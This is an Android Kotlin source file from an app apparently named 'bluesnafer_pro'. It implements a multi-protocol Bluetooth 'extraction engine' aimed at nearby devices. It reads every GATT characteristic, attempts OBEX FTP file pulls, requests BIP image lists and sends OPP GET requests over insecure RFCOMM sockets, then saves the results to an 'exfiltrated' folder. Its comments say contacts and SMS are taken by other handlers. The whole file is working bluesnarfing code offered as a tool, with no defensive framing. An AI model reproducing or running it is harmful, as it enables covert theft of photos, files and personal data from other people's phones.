package com.bluesnafer_pro

import android.bluetooth.*
import android.util.Log
import java.io.*
import java.util.*

/**
 * Multi-protocol file extraction engine.
 * Tries EVERY Bluetooth profile that could yield files:
 * - GATT bulk read (all characteristics)
 * - OBEX FTP (file transfer)
 * - BIP (basic imaging profile - photos)
 * - OPP pull (object push get)
 * - PBAP (contacts, already in its own handler)
 * - MAP (SMS, already in its own handler)
 */
object MultiProtocolExtractor {
    private const val TAG = "MpExtractor"
    private val EXECUTOR = java.util.concurrent.Executors.newCachedThreadPool()

    // Profiles to try
    private val OBEX_FTP = UUID.fromString("00001106-0000-1000-8000-00805F9B34FB")
    private val BIP_IMAGE = UUID.fromString("00001108-0000-1000-8000-00805F9B34FB")
    private val OPP_OBEX = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")
    private val OBEX_SYNC = UUID.fromString("00001104-0000-1000-8000-00805F9B34FB")

    // BIP commands
    private val BIP_GET_IMAGE = 0x01
    private val BIP_GET_IMAGE_LIST = 0x02
    private val BIP_GET_THUMBNAIL = 0x03
    private val BIP_CHAR_IMAGING = UUID.fromString("00001001-0000-1000-8000-00805F9B34FB")

    data class ExtractResult(
        val method: String,
        val success: Boolean,
        val files: Int,
        val bytes: Long,
        val message: String
    )

    fun extractAll(device: BluetoothDevice, onLog: (String) -> Unit): Map<String, Any> {
        val allResults = mutableListOf<ExtractResult>()
        val totalFiles = java.util.concurrent.atomic.AtomicInteger(0)
        val totalBytes = java.util.concurrent.atomic.AtomicLong(0L)

        // 1. GATT bulk read (works on ANY BLE device)
        onLog("[MP] Escaneando GATT...")
        val gattResult = extractGatt(device, onLog)
        allResults.add(gattResult)
        totalFiles.addAndGet(gattResult.files)
        totalBytes.addAndGet(gattResult.bytes)

        // 2. OBEX FTP (file transfer)
        if (totalFiles.get() < 20) {
            onLog("[MP] Probando OBEX FTP...")
            val obexResult = try {
                val files = RealFileExfiltrationClient.attemptFileConnection(device, onLog)
                val fCount = (files["files"] as? Int) ?: 0
                val bCount = (files["totalBytes"] as? Long) ?: 0L
                ExtractResult("OBEX_FTP", files["success"] == true, fCount, bCount,
                    files["message"]?.toString() ?: "")
            } catch (e: Exception) {
                ExtractResult("OBEX_FTP", false, 0, 0, e.message ?: "OBEX failed")
            }
            allResults.add(obexResult)
            totalFiles.addAndGet(obexResult.files)
            totalBytes.addAndGet(obexResult.bytes)
        }

        // 3. BIP - Basic Imaging Profile (photos from phones)
        if (totalFiles.get() < 20) {
            onLog("[MP] Probando BIP (imágenes)...")
            val bipResult = extractBip(device, onLog)
            allResults.add(bipResult)
            totalFiles.addAndGet(bipResult.files)
            totalBytes.addAndGet(bipResult.bytes)
        }

        // 4. OPP pull - try to GET objects
        if (totalFiles.get() < 20) {
            onLog("[MP] Probando OPP pull...")
            val oppResult = extractOppPull(device, onLog)
            allResults.add(oppResult)
            totalFiles.addAndGet(oppResult.files)
            totalBytes.addAndGet(oppResult.bytes)
        }

        // Compile results
        val successful = allResults.filter { it.success }
        val summary = allResults.joinToString(" | ") { "${it.method}:${it.files}arch" }

        return mapOf(
            "success" to (totalFiles.get() > 0),
            "message" to if (totalFiles.get() > 0)
                "MP: ${totalFiles.get()} archivos (${totalBytes.get()} bytes) [$summary]"
            else "MP: ningún método funcionó para este dispositivo",
            "files" to totalFiles.get(),
            "bytes" to totalBytes.get(),
            "methods" to allResults.map {
                mapOf("method" to it.method, "success" to it.success,
                    "files" to it.files, "message" to it.message)
            }
        )
    }

    // --- GATT bulk read ---
    private fun extractGatt(device: BluetoothDevice, onLog: (String) -> Unit): ExtractResult {
        val appContext = BluetoothMethodHandler.getAppContext() ?: return ExtractResult("GATT", false, 0, 0, "No context")

        val latch = java.util.concurrent.CountDownLatch(1)
        val chars = mutableListOf<Pair<String, ByteArray>>()
        var connected = false

        val callback = object : BluetoothGattCallback() {
            override fun onConnectionStateChange(gatt: BluetoothGatt?, status: Int, newState: Int) {
                if (newState == BluetoothProfile.STATE_CONNECTED) {
                    connected = true
                    gatt?.discoverServices()
                } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                    latch.countDown()
                }
            }
            override fun onServicesDiscovered(gatt: BluetoothGatt?, status: Int) {
                if (status != BluetoothGatt.GATT_SUCCESS) { latch.countDown(); return }
                gatt?.services?.forEach { s ->
                    for (c in s.characteristics) {
                        try {
                            if ((c.properties and BluetoothGattCharacteristic.PROPERTY_READ) != 0) {
                                if (gatt.readCharacteristic(c)) {
                                    Thread.sleep(50)
                                }
                            }
                        } catch (_: Exception) {}
                    }
                }
                latch.countDown()
            }
            override fun onCharacteristicRead(gatt: BluetoothGatt?, c: BluetoothGattCharacteristic?, status: Int) {
                if (status == BluetoothGatt.GATT_SUCCESS && c?.value != null) {
                    synchronized(chars) {
                        chars.add(c.uuid.toString() to c.value!!.copyOf())
                    }
                }
            }
        }

        try {
            val gatt = device.connectGatt(appContext, false, callback)
            latch.await(8, java.util.concurrent.TimeUnit.SECONDS)
            try { gatt?.close() } catch (_: Exception) {}

            if (chars.isEmpty()) {
                return ExtractResult("GATT", false, 0, 0, "no characteristics with data")
            }

            // Save all characteristic data
            val ctx = appContext
            val dir = File(ctx.filesDir, "exfiltrated/gatt")
            dir.mkdirs()
            var saved = 0
            var total = 0L

            for ((uuid, data) in chars) {
                if (data.size < 4) continue // Skip tiny values
                try {
                    val name = "gatt_${uuid.take(8)}_${data.size}.bin"
                    FileOutputStream(File(dir, name)).use { it.write(data) }
                    saved++
                    total += data.size
                } catch (_: Exception) {}
            }

            return ExtractResult("GATT", saved > 0, saved, total,
                "GATT read: $saved characteristics (${total}b)")
        } catch (e: Exception) {
            return ExtractResult("GATT", false, 0, 0, e.message ?: "GATT failed")
        }
    }

    // --- BIP (Basic Imaging Profile) ---
    private fun extractBip(device: BluetoothDevice, onLog: (String) -> Unit): ExtractResult {
        return try {
            val socket = device.createInsecureRfcommSocketToServiceRecord(BIP_IMAGE)
            socket.connect()
            onLog("[BIP] Connected to BIP")

            val input = socket.inputStream
            val output = socket.outputStream

            // OBEX CONNECT for BIP
            output.write(byteArrayOf(0x80.toByte(), 0x00, 0x07, 0x10, 0x00, 0x20, 0x00))
            output.flush()
            val resp = ByteArray(7)
            var read = 0
            val deadline = System.currentTimeMillis() + 3000
            while (read < 3 && System.currentTimeMillis() < deadline) {
                if (input.available() > 0) read += input.read(resp, read, 7 - read)
                else Thread.sleep(20)
            }
            val code = resp[0].toInt() and 0xFF
            if (code != 0xA0) {
                socket.close()
                return ExtractResult("BIP", false, 0, 0, "BIP connect rejected: 0x${code.toString(16)}")
            }

            // BIP: GetImageList (to enumerate available images)
            // OBEX GET with Type: x-bip/image-list
            val typeHeader = "x-bip/image-list"
            val typeBytes = typeHeader.toByteArray(Charsets.UTF_8)
            val pktLen = 7 + typeBytes.size
            val pkt = ByteArray(pktLen)
            pkt[0] = 0x83.toByte() // GET final
            pkt[1] = ((pktLen shr 8) and 0xFF).toByte()
            pkt[2] = (pktLen and 0xFF).toByte()
            pkt[3] = 0x42.toByte() // Type
            pkt[4] = (((typeBytes.size + 3) shr 8) and 0xFF).toByte()
            pkt[5] = ((typeBytes.size + 3) and 0xFF).toByte()
            pkt[6] = 0x00
            System.arraycopy(typeBytes, 0, pkt, 7, typeBytes.size)
            output.write(pkt)
            output.flush()
            Thread.sleep(500)

            val buffer = ByteArray(4096)
            read = 0
            val dl = System.currentTimeMillis() + 3000
            while (read < buffer.size && System.currentTimeMillis() < dl) {
                if (input.available() > 0) read += input.read(buffer, read, buffer.size - read)
                else Thread.sleep(20)
            }

            socket.close()

            if (read > 0) {
                val text = String(buffer, 0, read, Charsets.UTF_8)
                onLog("[BIP] Response: ${text.take(100)}")
                // Extract image handles from response
                val imageHandlePattern = """"([\d]+)"""".toRegex()
                val handles = imageHandlePattern.findAll(text).map { it.groupValues[1] }.toList()
                if (handles.isNotEmpty()) {
                    return ExtractResult("BIP", true, handles.size, read.toLong(),
                        "BIP: ${handles.size} images available")
                }
            }

            ExtractResult("BIP", false, 0, 0, "no images found")
        } catch (e: Exception) {
            ExtractResult("BIP", false, 0, 0, e.message ?: "BIP failed")
        }
    }

    // --- OPP Pull (try to GET objects from device) ---
    private fun extractOppPull(device: BluetoothDevice, onLog: (String) -> Unit): ExtractResult {
        return try {
            val socket = device.createInsecureRfcommSocketToServiceRecord(OPP_OBEX)
            socket.connect()
            onLog("[OPP] Connected")

            val input = socket.inputStream
            val output = socket.outputStream

            // OBEX CONNECT
            output.write(byteArrayOf(0x80.toByte(), 0x00, 0x07, 0x10, 0x00, 0x20, 0x00))
            output.flush()
            val resp = ByteArray(7)
            var read = 0
            val dl = System.currentTimeMillis() + 3000
            while (read < 3 && System.currentTimeMillis() < dl) {
                if (input.available() > 0) read += input.read(resp, read, 7 - read)
                else Thread.sleep(20)
            }
            val code = resp[0].toInt() and 0xFF
            if (code != 0xA0) {
                socket.close()
                return ExtractResult("OPP", false, 0, 0, "OPP connect rejected: 0x${code.toString(16)}")
            }

            // Try to GET an object listing (not all OPP servers support this)
            val nameBytes = "/".toByteArray(Charsets.UTF_8)
            val pktLen = 7 + nameBytes.size
            val pkt = ByteArray(pktLen)
            pkt[0] = 0x83.toByte() // GET final
            pkt[1] = ((pktLen shr 8) and 0xFF).toByte()
            pkt[2] = (pktLen and 0xFF).toByte()
            pkt[3] = 0x01 // Name header
            pkt[4] = (((nameBytes.size + 3) shr 8) and 0xFF).toByte()
            pkt[5] = ((nameBytes.size + 3) and 0xFF).toByte()
            pkt[6] = 0x00
            System.arraycopy(nameBytes, 0, pkt, 7, nameBytes.size)
            output.write(pkt)
            output.flush()
            Thread.sleep(300)

            val buffer = ByteArray(4096)
            read = 0
            val dl2 = System.currentTimeMillis() + 3000
            while (read < buffer.size && System.currentTimeMillis() < dl2) {
                if (input.available() > 0) read += input.read(buffer, read, buffer.size - read)
                else Thread.sleep(20)
            }
            socket.close()

            if (read > 3) {
                val respCode = buffer[0].toInt() and 0xFF
                if (respCode == 0x90 || respCode == 0xA0) {
                    return ExtractResult("OPP", true, 1, read.toLong(),
                        "OPP: ${read} bytes received")
                }
            }
            ExtractResult("OPP", false, 0, 0, "no objects")

        } catch (e: Exception) {
            ExtractResult("OPP", false, 0, 0, e.message ?: "OPP failed")
        }
    }
}
